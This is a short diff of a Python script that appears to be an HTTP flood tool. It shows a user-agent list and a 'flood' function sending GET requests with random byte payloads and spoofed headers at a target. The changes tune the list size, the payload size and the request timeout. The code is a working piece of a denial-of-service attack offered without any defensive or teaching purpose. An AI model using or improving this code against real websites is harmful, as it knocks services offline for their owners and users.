@@ -6,7 +6,7 @@ from colorama import Fore
 
 # Load user agents
 user_agents = []
-for _ in range(50000):
+for _ in range(5000):
     user_agents.append(randomData.random_useragent())
 
 # Headers
@@ -21,9 +21,9 @@ headers = {
 
 
 def flood(target):
-    payload = str(random._urandom(random.randint(50000, 100000)))
+    payload = str(random._urandom(random.randint(5000, 10000)))
     try:
-        r = requests.get(target, params=payload, headers=headers, timeout=1)
+        r = requests.get(target, params=payload, headers=headers, timeout=4)
     except requests.exceptions.ConnectTimeout:
         print(f"{Fore.RED}[!] {Fore.MAGENTA}Timed out{Fore.RESET}")
     except Exception as e:
